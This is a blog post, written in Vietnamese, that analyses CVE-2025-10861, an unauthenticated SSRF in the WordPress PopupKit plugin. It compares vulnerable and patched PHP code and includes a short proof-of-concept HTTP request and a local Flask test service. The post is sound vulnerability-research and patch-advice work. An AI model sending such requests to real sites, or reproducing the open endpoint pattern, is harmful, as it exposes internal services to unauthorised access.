---
title: CVE-2025-10861 Analysis & POC
description: Security Vulnerability in WordPress PopupKit Plugin.
date: 2025-10-27 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, ssrf]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers** cho WordPress tồn tại lỗ hổng **Server-Side Request Forgery (SSRF)** trong tất cả các phiên bản **từ đầu đến 2.1.4 (bao gồm cả 2.1.4)**.
Nguyên nhân là do **thiếu kiểm tra hợp lệ (insufficient validation)** đối với các **URL** được truyền thông qua tham số **`URL`**.
Điều này cho phép **kẻ tấn công chưa xác thực (unauthenticated attackers)** gửi các **web request** đến **địa chỉ tùy ý** xuất phát từ ứng dụng web, có thể được lợi dụng để **truy vấn hoặc chỉnh sửa thông tin từ các dịch vụ nội bộ (internal services)**, cũng như **thực hiện hoạt động trinh sát mạng (network reconnaissance)**.
Lỗ hổng này đã được **vá một phần (partially patched)** trong **phiên bản 2.1.4**.

* **CVE ID**: [CVE-2025-10861](https://www.cve.org/CVERecord?id=CVE-2025-10861)
* **Vulnerability Type**: Server Side Request Forgery (SSRF)
* **Affected Versions**: <= 2.1.4
* **Patched Versions**: 2.1.5
* **CVSS severity**: Medium (7.2)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress PopupKit Plugin](https://wordpress.org/plugins/popup-builder-block/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **PopupKit**: **2.1.3** (vulnerable) và **2.1.5** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

Vì 1 phần mã nguồn đã được vá trong phiên bản **2.1.4** nên ta sẽ sử dụng phiên bản **2.1.3** để phân tích.

```php {title="FetchDemo.php - v2.1.3" hl_lines=[4,6,12,13,20,21,26,28]}
protected function get_routes(): array {
    return [
        [
            'endpoint'            => '/live-preview',
            'methods'             => 'POST',
            'callback'            => 'fetch_external_content',
            'permission_callback' => '__return_true',
        ],...
    ];
}

public function fetch_external_content( \WP_REST_Request $request ) {
    $url = $request->get_param( 'url' );

    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
        return new \WP_REST_Response( array( 'error' => 'Invalid URL' ), 400 );
    }

    // Fetch the content using wp_remote_get
    $new_url  = add_query_arg( 'preview', 'true', $url );
    $response = wp_remote_get( $new_url );
    if ( is_wp_error( $response ) ) {
        return new \WP_REST_Response( array( 'error' => 'Error fetching content' ), 500 );
    }
    // Return the fetched content
    $body = wp_remote_retrieve_body( $response );
    $body = preg_replace( '/type="[^"]+-text\/javascript"/', 'type="text/javascript"', $body );
    return new \WP_REST_Response( array( 'content' => $body ), 200 );
}
```

Trong phiên bản **2.1.3**, plugin định nghĩa một API với POST method có `permission_callback => __return_true`, cho phép **mọi người dùng**, bao gồm cả **anonymous user**, thực thi hàm `fetch_external_content()` với tham số `url` bắt buộc.  
Hàm này sử dụng `wp_remote_get` để gửi request đến URL được truyền vào và trả lại nội dung phản hồi (response body).  

Do không có bất kỳ cơ chế kiểm soát hoặc lọc URL nội bộ nào, điều này khiến kẻ tấn công có thể gửi request đến các dịch vụ nội bộ (internal services) dẫn đến lỗ hổng **Server-Side Request Forgery (SSRF)** có thể khai thác bởi **anonymous user**.

```php {title="FetchDemo.php - v2.1.5" hl_lines=[4,6,12,20,19,25,27]}
protected function get_routes(): array {
    return [
        [
            'endpoint'            => '/live-preview-template',
            'methods'             => 'GET',
            'callback'            => 'fetch_external_content',
        ],...
    ];
}

public function fetch_external_content( \WP_REST_Request $request ) {
    $url = $request->get_param( 'url' );

    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
        return new \WP_REST_Response( array( 'error' => 'Invalid URL' ), 400 );
    }

    // Fetch the content using wp_remote_get
    $new_url  = add_query_arg( 'preview', 'true', $url );
    $response = wp_safe_remote_get( $new_url );
    if ( is_wp_error( $response ) ) {
        return new \WP_REST_Response( array( 'error' => 'Error fetching content' ), 500 );
    }
    // Return the fetched content
    $body = wp_remote_retrieve_body( $response );
    $body = preg_replace( '/type="[^"]+-text\/javascript"/', 'type="text/javascript"', $body );
    return new \WP_REST_Response( array( 'content' => $body ), 200 );
}
```

Trong bản vá **2.1.5**, plugin đã thực hiện một số thay đổi nhằm giảm thiểu nguy cơ **Server-Side Request Forgery (SSRF)**:
- **Đổi endpoint** từ `/live-preview` sang `/live-preview-template`.
- Thay thế hàm `wp_remote_get()` bằng `wp_safe_remote_get()`, giúp WordPress **tự động chặn các request đến địa chỉ nội bộ** như `localhost`, `127.0.0.1`, hoặc `169.254.*`.  
- Nhờ vậy, các yêu cầu từ người dùng đến tài nguyên nội bộ của máy chủ sẽ bị chặn, ngăn chặn khả năng khai thác SSRF.  

### Vulnerable Code 

Hàm `get_routes()` được gọi bên trong `register_routes()`:

```php {title="Api.php - v2.1.3" hl_lines=[4,7,8,10,11,12,13,14,20,21]}
protected $namespace = 'pbb/v1';

public function register_routes() {
    $routes = $this->get_routes();
    foreach ($routes as $route) {
        register_rest_route(
            $this->namespace,
            $route['endpoint'],
            [
                'methods'             => $route['methods'],
                'callback'            => [$this, $route['callback']],
                'permission_callback' => isset($route['permission_callback'])
                    ? $route['permission_callback']
                    : [$this, 'permission_callback'],
            ]
        );
    }
}

public function permission_callback(): bool {
    return current_user_can('manage_options');
}
```

Khi `register_routes()` được thực thi, tất cả các route được trả về từ `get_routes()` sẽ được đăng ký vào WordPress REST API thông qua hàm `register_rest_route()`.

Ở đây:
- Mỗi route sẽ ánh xạ tới một `endpoint`, `method` và `callback` tương ứng.  
- Nếu route không có khóa `permission_callback`, plugin sẽ tự động gán mặc định là `$this->permission_callback`, yêu cầu người dùng phải có quyền **manage_options** (thường chỉ có admin).  
- Tuy nhiên, trong phiên bản **2.1.3**, route `/live-preview` lại được khai báo thủ công với `permission_callback => '__return_true'`, nghĩa là **bỏ qua cơ chế kiểm tra quyền** ở trên, dẫn đến việc bất kỳ ai (kể cả anonymous user) cũng có thể gọi API này.  

Khi gửi yêu cầu **POST** đến endpoint `/wp-json/pbb/v1/live-preview`, hàm `fetch_external_content()` sẽ được thực thi. Hàm này nhận giá trị `url` từ tham số yêu cầu, thực hiện **fetch request** tới địa chỉ đó và trả về **body** của phản hồi.

## Exploit

### Local Server
Tạo local service đơn giản bằng python

```py
from flask import Flask, send_from_directory
import os

BASE_DIR = os.path.abspath(os.getcwd())
app = Flask(__name__)

@app.route('/metadata')
def test():
    return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001, debug=True)
```

```json {title="metadata.json"}
{
  "metadata": "Internal service data"
}
```

### Proof of Concept (PoC)

Gửi POST request đến endpoint

```http
POST /wp-json/pbb/v1/live-preview HTTP/1.1
Host: localhost
...

url=http://localhost:8001/metadata
```

**Result**:

![Result](result.png "Nội dung đọc được từ local service")

## Conclusion

Phiên bản **≤ 2.1.4** của **PopupKit** có lỗ hổng **SSRF**: endpoint `/wp-json/pbb/v1/live-preview` cho phép **anonymous** gọi `fetch_external_content()` với tham số `url` từ client; hàm này dùng `wp_remote_get()` và trả về trực tiếp phần body, do đó có thể bị lợi dụng để truy vấn các dịch vụ nội bộ. Bản **2.1.5** đã chuyển sang `wp_safe_remote_get()` và giới hạn quyền truy cập (chỉ admin), giúp giảm rủi ro.

## Key takeaways

* **Cập nhật** lên **2.1.5+**.
* **Không tin URL client** — xác thực/allowlist trước khi fetch.
* **Dùng `wp_safe_remote_get()`** và kiểm tra thêm (redirects, DNS).
* **Không dùng `permission_callback => __return_true`**; giới hạn quyền.
* **Không trả nguyên body thô** nếu không cần thiết.


## References

[SSRF (Server Side Request Forgery) — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)

[ WordPress PopupKit Plugin <= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) ](https://patchstack.com/database/wordpress/plugin/popup-builder-block/vulnerability/wordpress-popup-builder-with-gamification-multi-step-popups-page-level-targeting-and-woocommerce-triggers-plugin-2-1-4-unauthenticated-server-side-request-forgery-vulnerability) 